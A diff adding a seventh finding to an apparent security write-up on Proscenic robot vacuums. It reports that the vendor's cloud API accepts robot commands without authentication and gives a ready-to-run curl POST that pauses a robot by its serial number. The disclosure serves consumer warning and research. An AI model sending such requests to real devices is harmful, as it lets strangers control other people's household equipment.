@@ -110,4 +110,10 @@ this is sent to the IP and port retrieved by `getSockAddr`.
 
 **Finding 6**: Old tokens (fetched with the script) don't expire. Even if the app only allows for one simultanous login.
 
+## More findings
+**Fining 7**: Sending instructions to a robot does not require any authentication. All you need is the serial number:
+```bash
+curl -k -X POST  -H "Content-Type: application/x-www-form-urlencoded" -H "Host: mobile.proscenic.com.de:443" -d "pauseOrContinue=pause" "https://mobile.proscenic.com.de/instructions/<serialNumber>/21017?username="
+```
+
 **TLDR**: Don't buy this crap.
